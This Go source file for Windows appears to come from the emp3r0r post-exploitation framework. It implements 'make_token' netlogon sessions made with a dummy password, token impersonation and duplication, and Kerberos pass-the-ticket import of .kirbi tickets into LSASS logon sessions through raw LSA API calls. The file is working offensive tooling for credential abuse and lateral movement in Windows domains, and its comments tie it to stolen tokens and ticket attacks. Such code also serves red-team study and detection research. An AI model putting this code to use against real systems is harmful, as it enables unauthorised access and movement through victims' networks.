//go:build windows

package priv

import (
	"encoding/base64"
	"errors"
	"fmt"
	"strings"
	"time"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/syscall"
	"golang.org/x/sys/windows"
)

// ─────────────────────────────────────────────────────────────────────────────
// Netlogon (make_token) logon sessions — Windows implementation
//
// BOFs and starlark modules are token-aware: they run under a thread token
// (see ExecuteAsToken / ImpersonateThread). However, Kerberos operations that
// interact with LSA (ptt, asktgt /ptt, klist, …) are tied to a *logon
// session*, not just a token. Importing a ticket with
// LsaCallAuthenticationPackage(KerbSubmitTicketMessage) only succeeds when the
// calling thread has a logon session whose credentials match the ticket.
//
// MakeToken creates such a session via LogonUserW with
// LOGON32_LOGON_NEW_CREDENTIALS (a "netlogon"/new-credentials logon). This
// needs no real password (a dummy value is enough) and registers a brand new
// logon session in LSASS with its own AuthenticationId (LUID). Tickets can
// then be imported into that session (see ImportTicket / ImportTicketToLUID),
// and BOFs/starlark modules executed under the session's token (via the
// universal "token" option) see the imported tickets.
// ─────────────────────────────────────────────────────────────────────────────

const (
	// LogonUserW logon types / providers (winnt.h)
	logon32LogonNewCredentials = 9 // LOGON32_LOGON_NEW_CREDENTIALS
	logon32ProviderWinnt50     = 3 // LOGON32_PROVIDER_WINNT50

	// Dummy password used when the operator does not supply one. A netlogon
	// (new-credentials) logon accepts any value.
	defaultDummyPassword = "DummyP4ss!"

	// KERB_PROTOCOL_MESSAGE_TYPE (ntsecapi.h). NOTE: KerbSubmitTicketMessage
	// is 21, not 5 — the enum has ~13 more entries before it (Vista+ block).
	// Sending 5 (KerbUpdateAddressesMessage) makes LSASS reject the submission
	// with STATUS_ACCESS_DENIED.
	kerbSubmitTicketMessage = 21
)

var (
	modsecur32 = windows.NewLazySystemDLL("secur32.dll")

	procLsaConnectUntrusted          = modsecur32.NewProc("LsaConnectUntrusted")
	procLsaRegisterLogonProcess      = modsecur32.NewProc("LsaRegisterLogonProcess")
	procLsaDeregisterLogonProcess    = modsecur32.NewProc("LsaDeregisterLogonProcess")
	procLsaLookupAuthenticationPkg   = modsecur32.NewProc("LsaLookupAuthenticationPackage")
	procLsaCallAuthenticationPackage = modsecur32.NewProc("LsaCallAuthenticationPackage")
	procLsaFreeReturnBuffer          = modsecur32.NewProc("LsaFreeReturnBuffer")

	procLogonUserW = modadvapi32.NewProc("LogonUserW")
)

// lsaString mirrors the LSA_STRING struct from ntsecapi.h. Note that LSA_STRING
// is an ANSI structure: Buffer is a PCHAR (narrow) string, NOT a wide string.
// Passing a UTF-16 buffer here makes LsaLookupAuthenticationPackage fail with
// STATUS_UNKNOWN_REVISION (0xC00000FE).
type lsaString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *byte
}

// kerbSubmitTktRequest mirrors KERB_SUBMIT_TKT_REQUEST (ntsecapi.h):
//
//	MessageType (4) + LogonId (8) + Flags (4) + KERB_CRYPTO_KEY32 Key (12)
//	+ KerbCredSize (4) + KerbCredOffset (4) = 36 bytes
//
// The Key field selects the key used to decrypt the KRB-CRED EncKrbCredPart;
// zero means "use the logon session's default key". KRB-CRED data is appended
// right after this struct; KerbCredOffset is sizeof(KERB_SUBMIT_TKT_REQUEST).
// Omitting Key shifts KerbCredSize/KerbCredOffset to the wrong offsets and
// makes LSASS reject every submission with STATUS_ACCESS_DENIED.
type kerbSubmitTktRequest struct {
	MessageType    uint32 // KERB_PROTOCOL_MESSAGE_TYPE
	LogonId        windows.LUID
	Flags          uint32
	Key            kerbCryptoKey32 // key to decrypt KERB_CRED
	KerbCredSize   uint32
	KerbCredOffset uint32
}

// kerbCryptoKey32 mirrors KERB_CRYPTO_KEY32: KeyType, Length, and a 32-bit
// Offset relative to the buffer the key lives in (not a pointer).
type kerbCryptoKey32 struct {
	KeyType int32
	Length  uint32
	Offset  uint32
}

// luidToUint64 renders a LUID as an unsigned 64-bit value.
func luidToUint64(luid windows.LUID) uint64 {
	return uint64(uint32(luid.HighPart))<<32 | uint64(luid.LowPart)
}

// luidFromUint64 converts an unsigned 64-bit value back into a LUID.
func luidFromUint64(v uint64) windows.LUID {
	return windows.LUID{
		LowPart:  uint32(v & 0xffffffff),
		HighPart: int32(v >> 32),
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// make_token
// ─────────────────────────────────────────────────────────────────────────────

// MakeToken creates a netlogon logon session for the given user using a
// (dummy) password via LogonUserW(LOGON32_LOGON_NEW_CREDENTIALS,
// LOGON32_PROVIDER_WINNT50). The returned session carries an
// impersonation-capable duplicate of the logon token plus the logon session
// LUID (AuthenticationId), which is what ticket import and LSA-bound Kerberos
// operations need.
//
// It does NOT store the session anywhere: callers use StoreSession to cache
// it and RegisterSessionToken to make it addressable through the universal
// "token" option.
func MakeToken(user, domain, password string) (*LogonSession, error) {
	if strings.TrimSpace(user) == "" {
		return nil, errors.New("MakeToken: user must not be empty")
	}
	if strings.TrimSpace(domain) == "" {
		domain = "."
	}
	if strings.TrimSpace(password) == "" {
		password = defaultDummyPassword
	}

	userPtr, err := windows.UTF16PtrFromString(user)
	if err != nil {
		return nil, fmt.Errorf("MakeToken: UTF16 user: %w", err)
	}
	domainPtr, err := windows.UTF16PtrFromString(domain)
	if err != nil {
		return nil, fmt.Errorf("MakeToken: UTF16 domain: %w", err)
	}
	passPtr, err := windows.UTF16PtrFromString(password)
	if err != nil {
		return nil, fmt.Errorf("MakeToken: UTF16 password: %w", err)
	}

	var hPrimary windows.Handle
	r1, _, e1 := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passPtr)),
		uintptr(logon32LogonNewCredentials),
		uintptr(logon32ProviderWinnt50),
		uintptr(unsafe.Pointer(&hPrimary)),
	)
	if r1 == 0 {
		return nil, fmt.Errorf("LogonUserW(%s\\%s): %v", domain, user, e1)
	}
	defer windows.CloseHandle(hPrimary)

	// AuthenticationId of the newly created logon session.
	luid, err := GetTokenLogonID(hPrimary)
	if err != nil {
		return nil, fmt.Errorf("MakeToken: reading logon session LUID: %w", err)
	}

	// Duplicate into an impersonation token (same pattern as StealToken) so
	// the handle works with NtSetInformationThread impersonation and
	// CreateProcessWithTokenW.
	if syscall.RuntimeSyscallTable == nil {
		return nil, fmt.Errorf("MakeToken: syscall table not initialized")
	}
	hToken, err := DuplicateSystemToken(syscall.RuntimeSyscallTable, hPrimary)
	if err != nil {
		return nil, fmt.Errorf("MakeToken: duplicating logon token: %w", err)
	}

	return &LogonSession{
		User:      user,
		Domain:    domain,
		Token:     uintptr(hToken),
		LogonID:   luidToUint64(luid),
		CreatedAt: time.Now(),
	}, nil
}

// RegisterSessionToken makes the session addressable through the universal
// "token" option by storing its impersonation token in TokenMap under the
// session name. executeWithToken / module runners then resolve
// --token <session name> exactly like a stolen-token SID.
func RegisterSessionToken(session *LogonSession) {
	if session == nil || session.Token == 0 {
		return
	}
	TokenMap.Store(session.Name, windows.Handle(session.Token))
}

// GetTokenLogonID returns the AuthenticationId (logon session LUID) of a
// token, extracted from TOKEN_STATISTICS via NtQueryInformationToken.
func GetTokenLogonID(hToken windows.Handle) (windows.LUID, error) {
	buf, err := queryTokenInfo(hToken, syscall.TokenStatistics)
	if err != nil {
		return windows.LUID{}, err
	}
	// TOKEN_STATISTICS layout: LUID TokenId; LUID AuthenticationId; ...
	// AuthenticationId starts at offset 8.
	const authIDOffset = 8
	if len(buf) < authIDOffset+int(unsafe.Sizeof(windows.LUID{})) {
		return windows.LUID{}, fmt.Errorf("TOKEN_STATISTICS too small (%d bytes)", len(buf))
	}
	return *(*windows.LUID)(unsafe.Pointer(&buf[authIDOffset])), nil
}

// ─────────────────────────────────────────────────────────────────────────────
// Ticket import (LSA / Kerberos SSP)
// ─────────────────────────────────────────────────────────────────────────────

// ImportTicket imports a raw KRB-CRED (.kirbi) into the given session's
// logon session. The session token is impersonated on the calling thread
// while the LSA call runs, so the ticket lands in the session's logon
// session without requiring SYSTEM (SeImpersonatePrivilege is enough).
func ImportTicket(session *LogonSession, kirbi []byte) error {
	if session == nil {
		return errors.New("ImportTicket: session is nil")
	}
	if len(kirbi) == 0 {
		return errors.New("ImportTicket: ticket is empty")
	}
	return ExecuteAsToken(windows.Handle(session.Token), func() error {
		return submitTicket(kirbi, windows.LUID{}) // 0 → impersonated logon session
	})
}

// ImportTicketBase64 is ImportTicket with a base64-encoded KRB-CRED.
func ImportTicketBase64(session *LogonSession, ticketB64 string) error {
	kirbi, err := base64.StdEncoding.DecodeString(strings.TrimSpace(ticketB64))
	if err != nil {
		return fmt.Errorf("decoding ticket: %w", err)
	}
	return ImportTicket(session, kirbi)
}

// ImportTicketWithToken imports a base64 KRB-CRED into the logon session of
// the given token by impersonating it (LogonId=0 resolves to the
// impersonated session). When hToken is 0 the ticket is imported into the
// current process logon session.
func ImportTicketWithToken(hToken windows.Handle, ticketB64 string) error {
	kirbi, err := base64.StdEncoding.DecodeString(strings.TrimSpace(ticketB64))
	if err != nil {
		return fmt.Errorf("decoding ticket: %w", err)
	}
	if len(kirbi) == 0 {
		return errors.New("ImportTicketWithToken: ticket is empty")
	}
	if hToken == 0 {
		return submitTicket(kirbi, windows.LUID{}) // current logon session
	}
	return ExecuteAsToken(hToken, func() error {
		return submitTicket(kirbi, windows.LUID{}) // impersonated logon session
	})
}

// ImportTicketToLUID imports a raw KRB-CRED into the logon session with the
// given LUID. Targeting a session owned by another user requires SYSTEM
// (SeTcbPrivilege); otherwise LSASS denies the submission.
func ImportTicketToLUID(luid windows.LUID, kirbi []byte) error {
	if len(kirbi) == 0 {
		return errors.New("ImportTicketToLUID: ticket is empty")
	}
	return submitTicket(kirbi, luid)
}

// ImportTicketToLUIDBase64 is ImportTicketToLUID with a base64 KRB-CRED.
func ImportTicketToLUIDBase64(luid windows.LUID, ticketB64 string) error {
	kirbi, err := base64.StdEncoding.DecodeString(strings.TrimSpace(ticketB64))
	if err != nil {
		return fmt.Errorf("decoding ticket: %w", err)
	}
	return ImportTicketToLUID(luid, kirbi)
}

// submitTicket performs the LSA dance to import kirbi into the logon session
// identified by logonID (0 → the calling thread's logon session):
//
//	LsaConnectUntrusted | LsaRegisterLogonProcess("Winlogon")
//	LsaLookupAuthenticationPackage("kerberos")
//	LsaCallAuthenticationPackage(KerbSubmitTicketMessage)
//	LsaFreeReturnBuffer / LsaDeregisterLogonProcess
//
// An explicit logonID that is not the caller's own session requires the
// trusted handle from LsaRegisterLogonProcess (i.e. SYSTEM/TCB); the plain
// LsaConnectUntrusted handle can only submit to the caller's own session.
// This mirrors what the Kerbeus ptt BOF does, without needing a BOF.
func submitTicket(kirbi []byte, logonID windows.LUID) error {
	var hLsa uintptr
	var status uint32
	if logonID.LowPart == 0 && logonID.HighPart == 0 {
		// Current (thread) logon session: the unprivileged handle is enough.
		status = lsaConnectUntrusted(&hLsa)
		if status != 0 {
			return fmt.Errorf("LsaConnectUntrusted: status 0x%08X", status)
		}
	} else {
		// Explicit logon session: needs the trusted (registered) handle.
		status = lsaRegisterLogonProcess(&hLsa, "Winlogon")
		if status != 0 {
			return fmt.Errorf("LsaRegisterLogonProcess: status 0x%08X (explicit-LUID ticket import requires SYSTEM)", status)
		}
	}
	defer lsaDeregisterLogonProcess(hLsa)
	return submitTicketWithHandle(hLsa, kirbi, logonID)
}

// submitTicketWithHandle performs the KerbSubmitTicketMessage exchange over
// an already-connected LSA handle. hLsa must be valid; logonID 0 resolves to
// the calling thread's logon session.
func submitTicketWithHandle(hLsa uintptr, kirbi []byte, logonID windows.LUID) error {
	pkgName := newLsaString("kerberos")
	var authPackage uint32
	if status := lsaLookupAuthenticationPackage(hLsa, &pkgName, &authPackage); status != 0 {
		return fmt.Errorf("LsaLookupAuthenticationPackage: status 0x%08X", status)
	}

	// Build KERB_SUBMIT_TKT_REQUEST + appended KRB-CRED blob.
	reqSize := uint32(unsafe.Sizeof(kerbSubmitTktRequest{}))
	buf := make([]byte, reqSize+uint32(len(kirbi)))
	req := (*kerbSubmitTktRequest)(unsafe.Pointer(&buf[0]))
	req.MessageType = kerbSubmitTicketMessage
	req.LogonId = logonID
	req.Flags = 0
	req.KerbCredSize = uint32(len(kirbi))
	req.KerbCredOffset = reqSize
	copy(buf[reqSize:], kirbi)

	var response uintptr
	var responseSize uint32
	var protocolStatus uint32
	if status := lsaCallAuthenticationPackage(
		hLsa, authPackage, unsafe.Pointer(&buf[0]), uint32(len(buf)),
		&response, &responseSize, &protocolStatus,
	); status != 0 {
		return fmt.Errorf("LsaCallAuthenticationPackage: status 0x%08X", status)
	}
	if protocolStatus != 0 {
		return fmt.Errorf("LsaCallAuthenticationPackage protocol status: 0x%08X (ticket rejected)", protocolStatus)
	}
	if response != 0 {
		lsaFreeReturnBuffer(response)
	}
	logging.Debugf("submitTicket: imported %d-byte KRB-CRED into luid 0x%08x", len(kirbi), luidToUint64(logonID))
	return nil
}

// newLsaString builds an ANSI LSA_STRING wrapping a Go string.
func newLsaString(s string) lsaString {
	// Narrow (ANSI) bytes + trailing NUL; Length excludes the NUL, MaximumLength
	// includes it, matching LSA_STRING semantics.
	b := append([]byte(s), 0)
	return lsaString{
		Length:        uint16(len(s)),
		MaximumLength: uint16(len(b)),
		Buffer:        &b[0],
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// LSA API wrappers (secur32.dll)
//
// All LSA APIs return an NTSTATUS as their function value and do NOT set
// GetLastError. The raw syscall call therefore always yields a non-nil
// syscall.Errno(0) ("The operation completed successfully") in e1, which is
// meaningless here. These wrappers therefore return only the NTSTATUS and the
// callers check `status != 0` — checking e1 would turn every successful call
// into a failure.
// ─────────────────────────────────────────────────────────────────────────────

// lsaConnectUntrusted calls LsaConnectUntrusted.
func lsaConnectUntrusted(hLsa *uintptr) (ntstatus uint32) {
	r1, _, _ := procLsaConnectUntrusted.Call(uintptr(unsafe.Pointer(hLsa)))
	return uint32(r1)
}

// lsaRegisterLogonProcess calls LsaRegisterLogonProcess with the given
// logon-process name (e.g. "Winlogon"). The returned handle is trusted
// (TCB-equivalent for ticket submission), which is what makes importing into
// logon sessions other than the caller's own possible. Requires SYSTEM.
func lsaRegisterLogonProcess(hLsa *uintptr, processName string) (ntstatus uint32) {
	name := newLsaString(processName)
	var mode uint32 // LSA_OPERATIONAL_MODE; the RPC marshaller rejects a NULL ref pointer
	r1, _, _ := procLsaRegisterLogonProcess.Call(
		uintptr(unsafe.Pointer(&name)),
		uintptr(unsafe.Pointer(hLsa)),
		uintptr(unsafe.Pointer(&mode)),
	)
	return uint32(r1)
}

// lsaDeregisterLogonProcess calls LsaDeregisterLogonProcess.
func lsaDeregisterLogonProcess(hLsa uintptr) {
	procLsaDeregisterLogonProcess.Call(hLsa)
}

// lsaLookupAuthenticationPackage calls LsaLookupAuthenticationPackage.
func lsaLookupAuthenticationPackage(hLsa uintptr, packageName *lsaString, authPackage *uint32) (ntstatus uint32) {
	r1, _, _ := procLsaLookupAuthenticationPkg.Call(
		hLsa,
		uintptr(unsafe.Pointer(packageName)),
		uintptr(unsafe.Pointer(authPackage)),
	)
	return uint32(r1)
}

// lsaCallAuthenticationPackage calls LsaCallAuthenticationPackage.
func lsaCallAuthenticationPackage(
	hLsa uintptr,
	authPackage uint32,
	submitBuffer unsafe.Pointer,
	submitLength uint32,
	returnBuffer *uintptr,
	returnLength *uint32,
	protocolStatus *uint32,
) (ntstatus uint32) {
	r1, _, _ := procLsaCallAuthenticationPackage.Call(
		hLsa,
		uintptr(authPackage),
		uintptr(submitBuffer),
		uintptr(submitLength),
		uintptr(unsafe.Pointer(returnBuffer)),
		uintptr(unsafe.Pointer(returnLength)),
		uintptr(unsafe.Pointer(protocolStatus)),
	)
	return uint32(r1)
}

// lsaFreeReturnBuffer calls LsaFreeReturnBuffer.
func lsaFreeReturnBuffer(buffer uintptr) {
	procLsaFreeReturnBuffer.Call(buffer)
}
